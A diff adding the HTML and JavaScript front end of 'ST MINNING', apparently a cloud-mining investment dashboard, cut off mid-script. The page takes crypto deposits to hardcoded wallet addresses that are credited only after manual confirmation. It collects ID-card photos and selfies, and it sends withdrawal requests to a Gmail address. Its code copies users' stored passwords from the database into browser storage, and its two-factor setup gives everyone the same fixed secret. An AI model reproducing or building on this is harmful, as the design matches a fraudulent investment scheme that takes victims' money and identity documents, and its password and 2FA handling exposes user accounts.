@@ -1,0 +1,2539 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ST MINNING Dashboard</title>
+<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet" />
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<style>
+  :root {
+    --bg-gradient-dark: linear-gradient(to right, #0f0c29, #302b63, #24243e);
+    --bg-gradient-light: linear-gradient(to right, #f5f7fa, #c3cfe2);
+    --text-color-dark: white;
+    --text-color-light: #333;
+    --sidebar-bg-dark: #1a1a2e;
+    --sidebar-bg-light: #f0f0f0;
+    --card-bg-dark: rgba(255, 255, 255, 0.1);
+    --card-bg-light: rgba(0, 0, 0, 0.05);
+    --input-bg-dark: #222238;
+    --input-bg-light: #ffffff;
+    --package-gradient-dark: linear-gradient(135deg, blue, red, yellow);
+    --package-gradient-light: linear-gradient(135deg, #74ebd5, #9face6);
+    --summary-gradient-dark: linear-gradient(145deg, red, yellow);
+    --summary-gradient-light: linear-gradient(145deg, #efefef, #c3cfe2);
+    --btn-gradient-dark: linear-gradient(145deg, #ff4e50, #f9d423);
+    --btn-gradient-light: linear-gradient(145deg, #74ebd5, #9face6);
+  }
+  
+  [data-theme="dark"] {
+    --bg-gradient: var(--bg-gradient-dark);
+    --text-color: var(--text-color-dark);
+    --sidebar-bg: var(--sidebar-bg-dark);
+    --card-bg: var(--card-bg-dark);
+    --input-bg: var(--input-bg-dark);
+    --package-gradient: var(--package-gradient-dark);
+    --summary-gradient: var(--summary-gradient-dark);
+    --btn-gradient: var(--btn-gradient-dark);
+    --table-bg: #1a1a2e;
+    --border-color: rgba(255, 255, 255, 0.1);
+  }
+  
+  [data-theme="light"] {
+    --bg-gradient: var(--bg-gradient-light);
+    --text-color: var(--text-color-light);
+    --sidebar-bg: var(--sidebar-bg-light);
+    --card-bg: var(--card-bg-light);
+    --input-bg: var(--input-bg-light);
+    --package-gradient: var(--package-gradient-light);
+    --summary-gradient: var(--summary-gradient-light);
+    --btn-gradient: var(--btn-gradient-light);
+    --table-bg: #ffffff;
+    --border-color: rgba(0, 0, 0, 0.1);
+  }
+
+  body {
+    background: var(--bg-gradient);
+    color: var(--text-color);
+    font-family: 'Roboto', sans-serif;
+    margin: 0; padding: 0; overflow-x: hidden;
+    transition: all 0.3s ease;
+  }
+  .topbar {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 1rem 1rem 1rem 60px;
+    position: relative;
+  }
+  .dashboard-title {
+    font-size: 2rem; font-weight: bold;
+    background: linear-gradient(to right, #00c6ff, #0072ff);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  }
+  /* Hamburger Menu */
+  .menu-toggle {
+    position: absolute; left: 15px; top: 20px;
+    font-size: 1.8rem; cursor: pointer; z-index: 1001;
+    color: var(--text-color);
+  }
+  /* Sidebar styles */
+  .sidebar {
+    position: fixed; left: -250px; top: 0; width: 200px; height: 100%;
+    background-color: var(--sidebar-bg); padding-top: 70px; display: flex; flex-direction: column;
+    transition: all 0.4s ease-in-out; z-index: 1000; opacity: 0;
+  }
+  .sidebar.show {
+    left: 0; opacity: 1;
+  }
+  .sidebar button {
+    background: none; border: none; color: var(--text-color);
+    padding: 12px 20px; text-align: left; width: 100%;
+    font-size: 0.9rem; transition: background 0.3s ease;
+  }
+  .sidebar button:hover {
+    background-color: rgba(255, 255, 255, 0.1);
+  }
+  /* Summary cards */
+  .summary-card {
+    background: var(--summary-gradient);
+    color: var(--text-color);
+    border-radius: 15px;
+    padding: 1rem;
+    text-align: center;
+    margin-bottom: 1rem;
+  }
+  /* Package cards */
+  .package-card {
+    background: var(--package-gradient);
+    color: var(--text-color);
+    border-radius: 15px;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    text-align: center;
+    position: relative;
+    min-height: 190px;
+  }
+  .package-card.active {
+    border: 2px solid #00ff99;
+    box-shadow: 0 0 20px #00ff99;
+  }
+  .package-card button {
+    margin: 0.3rem;
+  }
+  .progress {
+    height: 20px; background: #444; border-radius: 10px; overflow: hidden; margin-top: 10px;
+  }
+  .progress-bar {
+    height: 100%; background-color: #00ff00; width: 0%; transition: width 1s linear;
+  }
+  /* Page styles */
+  #withdrawPage, #profilePage, #settingsPage, #transaction-section, #depositPage, #verificationPage, #twoFactorPage {
+    display: none;
+  }
+  .content-card {
+    background: var(--bg-gradient);
+    padding: 2rem;
+    border-radius: 10px;
+    max-width: 3000px;
+    margin: 2rem auto;
+    box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+  }
+  .content-card h3 {
+    background: rgba(68, 68, 102, 0.5);
+    margin-bottom: 1.5rem;
+    text-align: center;
+    color: var(--text-color);
+    font-weight: bold;
+    padding: 0.75rem 1rem;
+    width: 100%;
+    border-radius: 4px;
+    transition: background 0.3s ease;
+  }
+  .content-card form input,
+  .content-card form select {
+    margin-bottom: 1rem;
+    background: var(--input-bg);
+    border: none;
+    border-radius: 4px;
+    color: var(--text-color);
+    padding: 0.75rem 1rem;
+    font-size: 1rem;
+    width: 100%;
+  }
+  .content-card form input::placeholder {
+    color: #bbb;
+  }
+  .content-card form button[type="submit"] {
+    background: var(--btn-gradient);
+    border: none;
+    color: white;
+    font-weight: bold;
+    padding: 0.75rem 1rem;
+    width: 100%;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.3s ease;
+  }
+  .content-card form button[type="submit"]:hover {
+    opacity: 0.9;
+  }
+  .back-btn {
+    margin-top: 1rem;
+    width: 100%;
+    background: rgba(68, 68, 102, 0.5);
+    border: none;
+    color: var(--text-color);
+    padding: 0.75rem 1rem;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: background 0.3s ease;
+  }
+  .back-btn:hover {
+    background: rgba(102, 102, 136, 0.5);
+  }
+  /* Profile styles */
+  .profile-info {
+    background: var(--card-bg);
+    padding: 1rem;
+    border-radius: 10px;
+    margin-bottom: 1rem;
+  }
+  .profile-info p {
+    display: flex;
+    justify-content: space-between;
+    border-bottom: 1px solid var(--border-color);
+    padding: 0.5rem 0;
+  }
+  /* Settings styles */
+  .settings-option {
+    background: var(--card-bg);
+    border-radius: 10px;
+    padding: 1rem;
+    margin-bottom: 1rem;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+  .settings-option .form-switch {
+    padding-left: 2.5rem;
+  }
+  /* Loading spinner styles */
+  #loadingSpinner {
+    display: none;
+    position: fixed;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    color: var(--text-color);
+    text-align: center;
+    z-index: 1100;
+    background-color: rgba(0, 0, 0, 0.7);
+    padding: 2rem;
+    border-radius: 10px;
+  }
+  /* Notification styles */
+  #notification {
+    display: none;
+    position: fixed;
+    bottom: 4px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: #00ff99;
+    color: #111126;
+    padding: 1rem 2rem;
+    border-radius: 4px;
+    font-weight: bold;
+    box-shadow: 0 0 4px #00ff99;
+    z-index: 1100;
+  }
+  /* Transaction section styles */
+  .table-dark {
+    background-color: var(--table-bg);
+    color: var(--text-color);
+  }
+  .status-pending {
+    color: #ffcc00;
+  }
+  
+  /* Deposit page styles */
+  .card-container {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 1rem;
+    justify-content: center;
+    animation: fadeIn 1s ease-in-out;
+  }
+  
+  @keyframes fadeIn {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+  
+  .payment-card {
+    background: linear-gradient(135deg, red, yellow);
+    color: var(--text-color);
+    border-radius: 15px;
+    padding: 1rem;
+    flex: 1 1 200px;
+    max-width: 250px;
+    text-align: center;
+    cursor: pointer;
+    box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+    transition: transform 0.3s, box-shadow 0.3s;
+    user-select: none;
+    position: relative;
+  }
+  
+  .payment-card:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 25px rgba(255, 154, 158, 0.7);
+  }
+  
+  .payment-card.selected {
+    box-shadow: 0 0 30px 3px #00f260;
+    transform: scale(1.07);
+    font-weight: 700;
+    z-index: 10;
+  }
+  
+  #qrCodeTransaction {
+    margin: 1rem auto 0 auto;
+    width: 180px;
+    height: 180px;
+    background: #fff;
+    padding: 10px;
+    border-radius: 15px;
+    display: inline-block;
+  }
+  
+  .countdown {
+    font-size: 1.2rem;
+    margin-top: 1rem;
+    color: var(--text-color);
+  }
+  
+  .note {
+    font-size: 0.9rem;
+    color: #ccc;
+    margin-top: 2rem;
+  }
+  
+  /* Improved deposit form */
+  .deposit-form-group {
+    position: relative;
+    margin-bottom: 1.5rem;
+  }
+  
+  .deposit-form-group label {
+    position: absolute;
+    top: -10px;
+    left: 10px;
+    background: var(--bg-gradient);
+    padding: 0 10px;
+    font-size: 0.8rem;
+    color: var(--text-color);
+    transition: all 0.3s ease;
+  }
+  
+  .deposit-form-group input {
+    height: 50px;
+    background: var(--input-bg);
+    border: 1px solid var(--border-color);
+    border-radius: 8px;
+    color: var(--text-color);
+    padding: 10px 15px;
+    width: 100%;
+    font-size: 1rem;
+    transition: all 0.3s ease;
+  }
+  
+  .deposit-form-group input:focus {
+    border-color: #00c6ff;
+    box-shadow: 0 0 0 2px rgba(0, 198, 255, 0.25);
+    outline: none;
+  }
+  
+  .btn-next {
+    background: var(--btn-gradient);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    padding: 12px 20px;
+    width: 100%;
+    transition: all 0.3s ease;
+    cursor: pointer;
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  
+  .btn-next:hover {
+    box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
+    transform: translateY(-2px);
+  }
+  
+  .btn-next:active {
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+    transform: translateY(1px);
+  }
+  
+  /* Two-factor and verification styles */
+  .verification-container {
+    max-width: 600px;
+    margin: 0 auto;
+  }
+  
+  .verification-option {
+    background: var(--card-bg);
+    border-radius: 10px;
+    padding: 1.5rem;
+    margin-bottom: 1rem;
+    display: flex;
+    flex-direction: column;
+    gap: 1rem;
+  }
+  
+  .id-upload-area {
+    border: 2px dashed var(--border-color);
+    padding: 20px;
+    text-align: center;
+    border-radius: 10px;
+    cursor: pointer;
+    margin: 15px 0;
+  }
+  
+  .id-upload-area:hover {
+    background: rgba(0, 0, 0, 0.05);
+  }
+  
+  .camera-container {
+    width: 100%;
+    max-width: 320px;
+    height: 240px;
+    background: #000;
+    margin: 0 auto;
+    border-radius: 10px;
+    overflow: hidden;
+    position: relative;
+  }
+  
+  #selfieVideo {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  
+  #selfieCanvas {
+    display: none;
+  }
+  
+  .btn-primary {
+    background: linear-gradient(to right, #00c6ff, #0072ff);
+    border: none;
+    font-weight: bold;
+  }
+  
+  .qr-container {
+    margin: 20px auto;
+    width: 200px;
+    height: 200px;
+    padding: 10px;
+    background: #fff;
+    border-radius: 10px;
+  }
+  
+  .verification-code {
+    letter-spacing: 8px;
+    font-size: 1.5rem;
+    font-weight: bold;
+    text-align: center;
+    margin: 20px 0;
+  }
+  
+  .verification-step {
+    margin-bottom: 30px;
+  }
+  
+  .verification-step h4 {
+    margin-bottom: 15px;
+  }
+  
+  .verification-code-input {
+    letter-spacing: 12px;
+    font-size: 1.5rem;
+    text-align: center;
+    font-family: monospace;
+    padding: 10px;
+  }
+  
+  /* Mining status styles */
+  .mining-status-card {
+    background: var(--card-bg);
+    border-radius: 10px;
+    padding: 1rem;
+    margin-top: 1rem;
+    text-align: center;
+  }
+  
+  .mining-status-card.active {
+    border: 2px solid #00ff99;
+  }
+  
+  .mining-time-left {
+    font-size: 1.2rem;
+    font-weight: bold;
+    margin: 10px 0;
+  }
+  
+  .continue-mining-btn {
+    background: var(--btn-gradient);
+    color: white;
+    border: none;
+    border-radius: 8px;
+    font-weight: bold;
+    padding: 10px 15px;
+    margin-top: 10px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+  }
+  
+  .continue-mining-btn:hover {
+    opacity: 0.9;
+    transform: scale(1.05);
+  }
+  
+  .continue-mining-btn:disabled {
+    background: #666;
+    cursor: not-allowed;
+    opacity: 0.7;
+  }
+  
+  /* Responsive verification page */
+  @media (max-width: 768px) {
+    .verification-container {
+      padding: 0;
+    }
+    
+    .verification-option {
+      padding: 1rem;
+    }
+    
+    .camera-container {
+      height: auto;
+      max-width: 100%;
+    }
+    
+    .id-upload-area {
+      padding: 15px 10px;
+    }
+    
+    #idFrontImage, #idBackImage, #selfieImage {
+      max-width: 100%;
+      height: auto;
+    }
+  }
+  
+  /* Status colors */
+  .status-verified {
+    color: #00ff99;
+  }
+  
+  .status-pending {
+    color: #ffcc00;
+  }
+  
+  .status-rejected {
+    color: #ff6666;
+  }
+</style>
+</head>
+<body>
+
+<!-- Hamburger Menu Icon -->
+<div class="menu-toggle" onclick="toggleSidebar()">☰</div>
+
+<!-- Sidebar -->
+<div class="sidebar" id="sidebar">
+  <button onclick="backToDashboard()">🏠 Dashboard</button>
+  <button onclick="showProfilePage()">👤 Profile</button>
+  <button onclick="showDepositPage()">💸 Deposit</button>
+  <button onclick="showWithdrawPage()">💸 Withdraw</button>
+  <button onclick="showTransactionPage()">📄 Transactions</button>
+  <button onclick="showSettingsPage()">⚙️ Settings</button>
+  <button onclick="logout()">🚪 Logout</button>
+</div>
+
+<!-- Dashboard Content -->
+<div class="container py-4" id="dashboardSection">
+  <div class="topbar">
+    <div class="dashboard-title">ST MINNING</div>
+  </div>
+
+  <div id="dashboardView">
+    <div class="row text-center mb-4">
+      <div class="col-md-4">
+        <div class="summary-card">
+          <h5>Balance</h5>
+          <p id="balanceDisplay">$5.00</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="summary-card">
+          <h5>Today's Income</h5>
+          <p id="incomeDisplay">$0.00</p>
+        </div>
+      </div>
+      <div class="col-md-4">
+        <div class="summary-card">
+          <h5>Total Withdrawn</h5>
+          <p id="withdrawDisplay">$0.00</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="row" id="packages-container">
+      <!-- Package cards inserted here -->
+    </div>
+    
+    <!-- Mining status card -->
+    <div class="mining-status-card" id="miningStatusCard" style="display: none;">
+      <h4>Mining Status</h4>
+      <div class="mining-time-left" id="miningTimeLeft">Next mining click required in: <span id="nextMiningTime">--:--:--</span></div>
+      <button class="continue-mining-btn" id="continueMiningBtn" disabled>Continue Mining</button>
+    </div>
+  </div>
+</div>
+
+<!-- Profile Page -->
+<div class="container py-5" id="profilePage">
+  <div class="content-card">
+    <h3>User Profile</h3>
+    <div class="profile-info">
+      <p><strong>Username:</strong> <span id="profileUsername" data-user="username">Loading...</span></p>
+      <p><strong>Email:</strong> <span id="profileEmail" data-user="email">Loading...</span></p>
+      <p><strong>Balance:</strong> <span id="profileBalance">$0.00</span></p>
+      <p><strong>Daily Income:</strong> <span id="profileDailyIncome">$0.00</span></p>
+      <p><strong>Total Withdrawn:</strong> <span id="profileTotalWithdrawn">$0.00</span></p>
+      <p><strong>Mining Status:</strong> <span id="profileMiningStatus">Inactive</span></p>
+      <p><strong>Total Earnings:</strong> <span id="profileTotalEarnings">$0.00</span></p>
+      <p><strong>Verification Status:</strong> <span id="verificationStatus" data-user="verification">Not Verified</span></p>
+    </div>
+    <button class="btn btn-primary w-100 mb-2" onclick="showVerificationPage()">Complete Verification</button>
+    <button class="back-btn" onclick="backToDashboard()">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- Verification Page -->
+<div class="container py-5" id="verificationPage">
+  <div class="content-card">
+    <h3>Identity Verification</h3>
+    <div class="verification-container">
+      <div class="verification-option">
+        <h4>1. Upload ID Card</h4>
+        <p>Please upload a clear photo of your government-issued ID card (passport, driver's license, or national ID).</p>
+        <div class="id-upload-area" id="idUploadFront" onclick="document.getElementById('idFrontInput').click()">
+          <i class="material-icons">cloud_upload</i>
+          <p>Click to upload front side of ID</p>
+          <input type="file" id="idFrontInput" style="display: none;" accept="image/*" onchange="handleIdUpload(this, 'front')">
+        </div>
+        <div id="idFrontPreview" style="display: none; text-align: center; margin-top: 10px;">
+          <img id="idFrontImage" style="max-width: 100%; max-height: 200px; border-radius: 10px;">
+          <p class="text-success"><i class="material-icons">check_circle</i> Front side uploaded</p>
+        </div>
+        
+        <div class="id-upload-area" id="idUploadBack" onclick="document.getElementById('idBackInput').click()">
+          <i class="material-icons">cloud_upload</i>
+          <p>Click to upload back side of ID</p>
+          <input type="file" id="idBackInput" style="display: none;" accept="image/*" onchange="handleIdUpload(this, 'back')">
+        </div>
+        <div id="idBackPreview" style="display: none; text-align: center; margin-top: 10px;">
+          <img id="idBackImage" style="max-width: 100%; max-height: 200px; border-radius: 10px;">
+          <p class="text-success"><i class="material-icons">check_circle</i> Back side uploaded</p>
+        </div>
+      </div>
+      
+      <div class="verification-option">
+        <h4>2. Take Selfie</h4>
+        <p>Please take a clear selfie of your face for verification.</p>
+        <div class="camera-container">
+          <video id="selfieVideo" autoplay playsinline></video>
+          <canvas id="selfieCanvas"></canvas>
+        </div>
+        <button class="btn btn-primary mt-3" id="captureSelfieBtn" onclick="captureSelfie()">Take Selfie</button>
+        <div id="selfiePreview" style="display: none; text-align: center; margin-top: 10px;">
+          <img id="selfieImage" src="https://public.youware.com/users-website-assets/prod/862cf762-cab0-49e2-8793-86c1b2fcad50/gf99083fb8b5a0f13ebcdfa721584759f55940e30363c4f09bd0d37c8507aa26dcaac988e35006ac50bf591c8f4815e540edf942c8c1d494d86a4a0f21fe7f06a_1280.jpg" style="max-width: 100%; max-height: 200px; border-radius: 10px;">
+          <p class="text-success"><i class="material-icons">check_circle</i> Selfie captured</p>
+        </div>
+      </div>
+      
+      <button class="btn btn-primary w-100 mt-4" id="submitVerificationBtn" onclick="submitVerification()">Submit Verification</button>
+      <button class="back-btn" onclick="showProfilePage()">Back to Profile</button>
+    </div>
+  </div>
+</div>
+
+<!-- Two-Factor Authentication Page -->
+<div class="container py-5" id="twoFactorPage">
+  <div class="content-card">
+    <h3>Set Up Google Authenticator</h3>
+    <div class="verification-container">
+      <div class="verification-step">
+        <h4>Step 1: Scan QR Code</h4>
+        <p>Open your Google Authenticator app and scan the QR code below:</p>
+        <div class="qr-container" id="twoFactorQR"></div>
+        <p class="small text-center">Or enter this code manually: <strong>STMINNING123456</strong></p>
+        <p class="small text-muted mt-2">This will generate a time-based one-time password (TOTP) for secure access to your account.</p>
+      </div>
+      
+      <div class="verification-step">
+        <h4>Step 2: Enter Verification Code</h4>
+        <p>Enter the 6-digit code from your Google Authenticator app:</p>
+        <input type="text" class="form-control verification-code-input" id="twoFactorCode" maxlength="6" placeholder="------">
+        <button class="btn btn-primary w-100 mt-3" onclick="verifyTwoFactorCode()">Verify Code</button>
+      </div>
+      
+      <button class="back-btn" onclick="showSettingsPage()">Back to Settings</button>
+    </div>
+  </div>
+</div>
+
+<!-- Deposit Page -->
+<div class="container py-5" id="depositPage">
+  <div class="content-card">
+    <h3>Deposit Funds</h3>
+    <form id="depositForm">
+      <div id="depositContent">
+        <h4 class="text-center mb-4">Select Payment Method</h4>
+        <div class="card-container" id="paymentCards">
+          <div class="payment-card" onclick="selectMethod('USDT TRC20', 'TJojFCfEbumnF9fP72PQtuMkDTL2XGiNkf')">USDT TRC20</div>
+          <div class="payment-card" onclick="selectMethod('USDT ERC20', '0x1e6bd08aa12e01a0369b2e36a80b6d0237171c45')">USDT ERC20</div>
+          <div class="payment-card" onclick="selectMethod('BTC', '1JtnVwqzDWzADkSzDJ5GbnZwFZD1emBXKL')">BTC</div>
+          <div class="payment-card" onclick="selectMethod('BNB', '0x1e6bd08aa12e01a0369b2e36a80b6d0237171c45')">BNB</div>
+          <div class="payment-card" onclick="selectMethod('Binance Pay ID', '521069007')">Binance Pay ID</div>
+        </div>
+
+        <div id="amountSection" style="display:none; max-width: 500px; margin: 20px auto;">
+          <div class="deposit-form-group">
+            <label for="depositUsername">Username</label>
+            <input type="text" id="depositUsername" placeholder="Enter your username" required>
+          </div>
+          
+          <div class="deposit-form-group">
+            <label for="depositAmount">Amount (USD)</label>
+            <input type="number" id="depositAmount" placeholder="Minimum deposit: $10" min="10" required>
+          </div>
+          
+          <button type="button" class="btn-next" onclick="proceedToTransaction()">Next</button>
+        </div>
+      </div>
+
+      <div id="transactionDetails" style="display:none; text-align:center;">
+        <h4>Transaction Details</h4>
+        <p><strong>Method:</strong> <span id="finalMethod"></span></p>
+        <p><strong>Send To:</strong> <span id="finalAddress"></span></p>
+        <p><strong>Amount:</strong> $<span id="finalAmount"></span></p>
+        <div id="qrCodeTransaction"></div>
+        <div class="countdown" id="countdownTimer"></div>
+        
+        <div class="deposit-form-group mt-4">
+          <label for="transactionId">Transaction ID</label>
+          <input type="text" id="transactionId" placeholder="Enter transaction ID after payment" required>
+        </div>
+        
+        <button type="button" class="btn-next" onclick="submitDeposit()">Confirm Deposit</button>
+        
+        <p class="note mt-3">
+          Your payment will be added to your wallet after manual confirmation.<br />
+          Kindly use the same deposit account name as your ST MINNING account for faster transaction processing.
+        </p>
+      </div>
+    </form>
+    <button class="back-btn" id="depositBackBtn" onclick="backToDashboard()">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- Settings Page -->
+<div class="container py-5" id="settingsPage">
+  <div class="content-card">
+    <h3>Settings</h3>
+    <div class="settings-option">
+      <span>Email Notifications</span>
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="emailNotificationsToggle" checked>
+      </div>
+    </div>
+    <div class="settings-option">
+      <span>Two-Factor Authentication</span>
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="twoFactorToggle">
+      </div>
+    </div>
+    <div class="settings-option">
+      <span>Dark Mode</span>
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="darkModeToggle" checked>
+      </div>
+    </div>
+    <div class="settings-option">
+      <span>Auto-Reinvest Earnings</span>
+      <div class="form-check form-switch">
+        <input class="form-check-input" type="checkbox" id="autoReinvestToggle">
+      </div>
+    </div>
+    <button class="back-btn" onclick="backToDashboard()">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- Withdraw Page -->
+<div class="container py-5" id="withdrawPage">
+  <div class="content-card">
+    <h3>Withdraw Funds</h3>
+    <form id="withdrawForm" action="https://formsubmit.co/stminning@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="New Withdrawal Request" />
+      <input type="hidden" name="_captcha" value="false" />
+      <input type="hidden" name="_next" value="https://stminning.w3spaces.com" />
+      <input type="hidden" name="_template" value="table" />
+
+      <input type="text" class="form-control" name="Username" placeholder="Username" required />
+      <input type="email" class="form-control" name="Email" placeholder="Email Address" required />
+      <input type="number" class="form-control" id="withdrawAmount" name="Amount" placeholder="Amount (min $10)" min="10" required />
+      <select class="form-select" name="Method" required>
+        <option value="">Select Withdrawal Method</option>
+        <option value="Bank Transfer">Bank Transfer</option>
+        <option value="Bitcoin">Bitcoin</option>
+        <option value="Ethereum">Ethereum</option>
+        <option value="USDT">USDT</option>
+        <option value="Paypal">Paypal</option>
+      </select>
+      <input type="text" class="form-control" name="Wallet" placeholder="Wallet Address / Account Number" required />
+
+      <button type="submit">Withdraw</button>
+    </form>
+    <button class="back-btn" onclick="backToDashboard()">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- Transaction Section -->
+<div class="container py-5" id="transaction-section">
+  <div class="content-card">
+    <h3>Transaction History</h3>
+    <div class="table-responsive">
+      <table class="table table-dark table-bordered table-hover" id="transactionTable">
+        <thead>
+          <tr>
+            <th>Date</th>
+            <th>Amount</th>
+            <th>Method</th>
+            <th>Status</th>
+          </tr>
+        </thead>
+        <tbody id="transactionBody">
+          <!-- Transactions will be inserted here -->
+        </tbody>
+      </table>
+    </div>
+    <button class="back-btn" onclick="backToDashboard()">Back to Dashboard</button>
+  </div>
+</div>
+
+<!-- Loading Spinner -->
+<div id="loadingSpinner">
+  <div class="spinner-border text-light" role="status"></div>
+  <p>Processing...</p>
+</div>
+
+<!-- Notification -->
+<div id="notification"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+<script>
+  // Global variables for theme
+  let currentTheme = 'dark';
+  let emailNotifications = true;
+  let twoFactorAuth = false;
+  let autoReinvest = false;
+  let selectedMethod = '';
+  let selectedAddress = '';
+  let isVerified = false;
+  let idFrontUploaded = false;
+  let idBackUploaded = false;
+  let selfieCaptured = false;
+  let idFrontData = '';
+  let idBackData = '';
+  let selfieData = '';
+  let nextMiningClickTime = null;
+  
+  // Initialize Supabase
+  const supabaseUrl = 'https://jwusmuqhkibfkyoekycz.supabase.co';
+  const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imp3dXNtdXFoa2liZmt5b2VreWN6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDk5MjUwNDYsImV4cCI6MjA2NTUwMTA0Nn0.E9AycnI_D3DBEInPRUcz2R3vSMgZ-XVLDYgu9LWCowQ';
+  const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+  
+  console.log('✅ Supabase initialized for transaction management');
+  
+  // Function to refresh user data from Supabase every 5 seconds
+  // This ensures any changes made in admin panel are reflected in the user dashboard
+  async function refreshUserData() {
+    const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (!currentUser || !currentUser.id) return;
+    
+    try {
+      // Get updated user data from Supabase
+      const { data: userData, error: userError } = await supabase
+        .from('users')
+        .select('*')
+        .eq('id', currentUser.id)
+        .single();
+      
+      if (userError) {
+        console.error('Error refreshing user data:', userError);
+        return;
+      }
+      
+      if (userData) {
+        // Update the local user data with the fresh database data
+        currentUser.username = userData.username;
+        currentUser.email = userData.email;
+        currentUser.balance = userData.balance;
+        currentUser.verification_status = userData.verification_status;
+        currentUser.is_verified = userData.is_verified;
+        currentUser.daily_income = userData.daily_income;
+        currentUser.total_withdrawn = userData.total_withdrawn;
+        currentUser.password = userData.password; // For profile display
+        
+        // Save updated user back to localStorage
+        localStorage.setItem('currentUser', JSON.stringify(currentUser));
+        
+        // Update UI elements
+        updateSummary();
+        updateProfileInfo();
+        loadTransactions();
+        
+        console.log('User data refreshed successfully');
+      }
+      
+      // Also refresh transactions from database
+      await loadTransactionsFromDB();
+      
+    } catch (error) {
+      console.error('Exception in refreshUserData:', error);
+    }
+  }
+  
+  // Function to load transactions from Supabase
+  async function loadTransactionsFromDB() {
+    const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (!currentUser || !currentUser.id) return;
+    
+    try {
+      const { data: transactions, error } = await supabase
+        .from('transactions')
+        .select('*')
+        .eq('user_id', currentUser.id)
+        .order('created_at', { ascending: false });
+      
+      if (error) {
+        console.error('Error loading transactions from DB:', error);
+        return;
+      }
+      
+      // Convert database transactions to localStorage format
+      const formattedTransactions = transactions.map(tx => ({
+        date: new Date(tx.created_at).toLocaleString(),
+        amount: parseFloat(tx.amount).toFixed(2),
+        method: tx.method || 'N/A',
+        transactionId: tx.reference_id || tx.id,
+        status: tx.status === 'completed' ? 'Completed' : 
+                tx.status === 'failed' ? 'Failed' : 'Pending',
+        type: tx.transaction_type === 'deposit' ? 'Deposit' : 
+              tx.transaction_type === 'withdrawal' ? 'Withdrawal' : 
+              tx.transaction_type === 'fee' ? 'Fee' : 'Mining'
+      }));
+      
+      // Update localStorage with fresh transactions
+      currentUser.transactions = formattedTransactions;
+      localStorage.setItem('currentUser', JSON.stringify(currentUser));
+      
+      // Update UI
+      loadTransactions();
+      
+    } catch (error) {
+      console.error('Exception in loadTransactionsFromDB:', error);
+    }
+  }
+  
+  // Function to update profile information display
+  function updateProfileInfo() {
+    const currentUser = JSON.parse(localStorage.getItem('currentUser'));
+    if (!currentUser) return;
+    
+    // Update profile elements if they exist
+    const usernameElements = document.querySelectorAll('[data-user="username"]');
+    const emailElements = document.querySelectorAll('[data-user="email"]');
+    const verificationElements = document.querySelectorAll('[data-user="verification"]');
+    
+    usernameElements.forEach(el => el.textContent = currentUser.username || 'N/A');
+    emailElements.forEach(el => el.textContent = currentUser.email || 'N/A');
+    verificationElements.forEach(el => {
+      el.textContent = currentUser.verification_status || 'Not Verified';
+      el.className = 'badge ' + (currentUser.is_verified ? 'bg-success' : 'bg-warning');
+    });
+    
+    // Update main display elements
+    const profileUsername = document.getElementById('profileUsername');
+    const profileEmail = document.getElementById('profileEmail');
+    const profileStatus = document.getElementById('profileStatus');
+    
+    if (profileUsername) profileUsername.textContent = currentUser.username || 'N/A';
+    if (profileEmail) profileEmail.textContent = currentUser.email || 'N/A';
+    if (profileStatus) {
+      profileStatus.textContent = currentUser.verification_status || 'Not Verified';
+      profileStatus.className = 'badge ' + (currentUser.is_verified ? 'bg-success' : 'bg-warning');
+    }
+  }
+  
+  // Set up auto-refresh of user data every 5 seconds for real-time updates
+  setInterval(refreshUserData, 5000);
+  
+  // Initial refresh when page loads
+  document.addEventListener('DOMContentLoaded', function() {
+    setTimeout(refreshUserData, 1000); // Wait 1 second after page load
+  });
+
+  // Check authentication on page load
+  document.addEventListener('DOMContentLoaded', function() {
+    checkAuthentication();
+    initDashboard();
+    
